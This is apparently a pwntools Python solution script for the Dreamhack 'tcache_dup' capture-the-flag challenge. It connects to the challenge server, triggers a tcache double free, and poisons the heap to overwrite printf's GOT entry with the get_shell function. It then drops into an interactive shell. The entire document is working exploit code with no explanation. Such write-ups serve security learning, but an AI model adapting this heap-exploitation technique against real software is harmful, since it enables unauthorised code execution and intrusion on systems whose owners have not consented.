from pwn import *

port = 22372
rem = remote("host3.dreamhack.games", port)

elf = ELF("./tcache_dup/problem/tcache_dup")

def create(size, data):
  rem.sendlineafter(b'>', b'1')
  rem.sendlineafter(b'Size: ', str(size).encode())
  rem.sendlineafter(b'Data: ', data)

def delete(idx):
  rem.sendlineafter(b'>', b'2')
  rem.sendlineafter(b'idx: ', str(idx).encode())


create(0x10, b'A' * 8)
delete(0)
delete(0)

create(0x10, p64(elf.got['printf']))
create(0x10, b'B' * 8)
create(0x10, p64(elf.symbols['get_shell']))

rem.interactive()